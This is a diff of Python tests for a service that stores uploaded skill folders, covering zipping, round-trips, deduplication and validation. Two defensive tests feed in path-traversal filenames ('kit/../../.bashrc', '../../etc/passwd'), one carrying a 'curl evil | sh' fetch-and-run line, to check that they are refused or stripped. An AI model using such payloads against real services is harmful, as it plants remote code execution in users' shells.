@@ -46,6 +46,37 @@ def blob_path(settings: Settings, content: bytes) -> Path:
     return settings.blob_dir / digest[0:2] / digest[2:4] / digest
 
 
+SETUP_SCRIPT = b"#!/bin/sh\necho set the machine up\n"
+LOGO = b"\x89PNG\r\n\x1a\n\x00\xff" + b"folder-logo" * 8
+
+
+def folder_of(label: str) -> dict[str, bytes]:
+    """A skill that is a folder: a SKILL.md, a script, and something binary."""
+    return {
+        f"{label}/SKILL.md": f"---\nname: {label}\n---\n\nRun scripts/setup.sh.\n".encode(),
+        f"{label}/scripts/setup.sh": SETUP_SCRIPT,
+        f"{label}/reference/logo.png": LOGO,
+    }
+
+
+async def upload_folder(
+    client: AsyncClient,
+    label: str,
+    files: dict[str, bytes],
+    *,
+    project_key: str = "ATL",
+    **form: str,
+) -> tuple[int, dict]:
+    """Post a folder the way a directory picker does: one part per file."""
+    response = await client.post(
+        f"/projects/{project_key}/skills",
+        files=[("file", (path, data, "application/octet-stream")) for path, data in files.items()],
+        data={"folder": label, **form},
+    )
+    assert response.status_code in {200, 201}, response.text
+    return response.status_code, response.json()
+
+
 @pytest.fixture
 async def project(signed_in: AsyncClient) -> AsyncClient:
     """A signed-in client with one project to hang skills off."""
@@ -393,6 +424,168 @@ class TestASkillAsAFolder:
 
     async def test_is_404_for_a_skill_that_is_not_there(self, project: AsyncClient) -> None:
         assert (await project.get(f"/skills/{UNKNOWN_ID}/folder")).status_code == 404
+
+
+class TestUploadingAFolder:
+    """A skill is usually a SKILL.md and the files it points at, picked together."""
+
+    async def test_stores_the_whole_folder_as_one_skill(self, project: AsyncClient) -> None:
+        code, skill = await upload_folder(
+            project, "cylist-kit", folder_of("cylist-kit"), description="Set a machine up."
+        )
+
+        assert code == 201
+        assert skill["name"] == "cylist-kit.zip", "one skill, named after the folder"
+        assert skill["mime"] == "application/zip"
+        assert skill["description"] == "Set a machine up."
+        assert [one["name"] for one in (await project.get("/projects/ATL/skills")).json()] == [
+            "cylist-kit.zip"
+        ]
+
+    async def test_gives_every_file_back_byte_for_byte(self, project: AsyncClient) -> None:
+        _, skill = await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
+
+        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
+
+        assert body["folder"] == "cylist-kit"
+        files = {one["path"]: one for one in body["files"]}
+        assert list(files) == ["SKILL.md", "reference/logo.png", "scripts/setup.sh"]
+        assert files["SKILL.md"]["content"].endswith("Run scripts/setup.sh.\n")
+        assert files["scripts/setup.sh"]["content"] == SETUP_SCRIPT.decode()
+        assert base64.b64decode(files["reference/logo.png"]["content"]) == LOGO
+
+    async def test_downloads_as_a_zip_that_uploads_again_unchanged(
+        self, project: AsyncClient
+    ) -> None:
+        _, skill = await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
+        download = await project.get(f"/skills/{skill['id']}/download")
+        before = (await project.get(f"/skills/{skill['id']}/folder")).json()["files"]
+
+        again = await project.post(
+            "/projects/ATL/skills",
+            files={"file": ("cylist-kit.zip", download.content, "application/zip")},
+        )
+
+        assert download.status_code == 200
+        assert again.status_code == 200, "same name, so it replaced itself"
+        assert again.json()["id"] == skill["id"]
+        after = (await project.get(f"/skills/{skill['id']}/folder")).json()["files"]
+        assert after == before, "what was downloaded is what can be uploaded"
+
+    async def test_the_same_folder_twice_costs_one_blob(
+        self, project: AsyncClient, session: AsyncSession
+    ) -> None:
+        before = await session.scalar(select(func.count()).select_from(Blob))
+
+        await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
+        code, _ = await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
+
+        assert code == 200, "the name is the skill, so the second is a replacement"
+        after = await session.scalar(select(func.count()).select_from(Blob))
+        assert after == (before or 0) + 1, "packed the same way both times"
+
+    async def test_replacing_a_folder_drops_a_file_that_went(self, project: AsyncClient) -> None:
+        await upload_folder(project, "cylist-kit", folder_of("cylist-kit"))
+
+        _, skill = await upload_folder(
+            project,
+            "cylist-kit",
+            {"cylist-kit/SKILL.md": b"---\nname: cylist-kit\n---\n\nNothing else now.\n"},
+        )
+
+        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
+        assert [one["path"] for one in body["files"]] == ["SKILL.md"]
+
+    async def test_marks_the_parts_the_uploader_said_are_executable(
+        self, project: AsyncClient
+    ) -> None:
+        response = await project.post(
+            "/projects/ATL/skills",
+            files=[
+                ("file", (path, data, "application/octet-stream"))
+                for path, data in folder_of("cylist-kit").items()
+            ],
+            data={"folder": "cylist-kit", "executable": "cylist-kit/scripts/setup.sh"},
+        )
+
+        body = (await project.get(f"/skills/{response.json()['id']}/folder")).json()
+        marked = {one["path"]: one["executable"] for one in body["files"]}
+        assert marked == {
+            "SKILL.md": False,
+            "reference/logo.png": False,
+            "scripts/setup.sh": True,
+        }
+
+    async def test_takes_a_folder_holding_only_a_skill_md(self, project: AsyncClient) -> None:
+        _, skill = await upload_folder(
+            project, "day-report", {"day-report/SKILL.md": b"Write the day up.\n"}
+        )
+
+        assert skill["name"] == "day-report.zip", "one part, but a folder was named"
+        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
+        assert body["folder"] == "day-report"
+
+    async def test_refuses_a_folder_with_no_skill_md(self, project: AsyncClient) -> None:
+        response = await project.post(
+            "/projects/ATL/skills",
+            files=[("file", ("kit/README.md", b"Nothing here.\n", "text/markdown"))],
+            data={"folder": "kit"},
+        )
+
+        assert response.status_code == 422
+        assert "no SKILL.md at its root" in response.json()["error"]["message"]
+        assert (await project.get("/projects/ATL/skills")).json() == [], "and nothing was stored"
+
+    async def test_refuses_a_part_that_points_outside_the_folder(
+        self, project: AsyncClient
+    ) -> None:
+        response = await project.post(
+            "/projects/ATL/skills",
+            files=[
+                ("file", ("kit/SKILL.md", b"Do it.\n", "text/markdown")),
+                ("file", ("kit/../../.bashrc", b"curl evil | sh\n", "text/plain")),
+            ],
+            data={"folder": "kit"},
+        )
+
+        assert response.status_code == 422
+        assert "points outside the skill's folder" in response.json()["error"]["message"]
+
+    async def test_refuses_a_folder_over_the_cap(self, capped: AsyncClient) -> None:
+        response = await capped.post(
+            "/projects/ATL/skills",
+            files=[
+                ("file", ("kit/SKILL.md", b"Do it.\n", "text/markdown")),
+                ("file", ("kit/big.bin", b"x" * (2 << 20), "application/octet-stream")),
+            ],
+            data={"folder": "kit"},
+        )
+
+        assert response.status_code == 413
+        assert (await capped.get("/projects/ATL/skills")).json() == []
+
+
+class TestASingleFileSkillIsUnchanged:
+    """A folder is the new way in, not the only one."""
+
+    async def test_is_stored_as_the_file_it_was_sent_as(self, project: AsyncClient) -> None:
+        content = content_of("still-markdown")
+
+        skill = await upload(project, "board-tidy.md", content)
+
+        assert skill["name"] == "board-tidy.md", "not board-tidy.zip"
+        assert skill["mime"] == "text/markdown"
+        download = await project.get(f"/skills/{skill['id']}/download")
+        assert download.content == content, "the markdown itself, not a zip of it"
+
+    async def test_still_strips_a_directory_off_a_lone_filename(self, project: AsyncClient) -> None:
+        response = await project.post(
+            "/projects/ATL/skills",
+            files={"file": ("../../etc/passwd", b"root:x:0:0", "text/plain")},
+        )
+
+        assert response.status_code == 201
+        assert response.json()["name"] == "passwd", "one part and no folder is one file"
 
 
 class TestTheHubCounts:
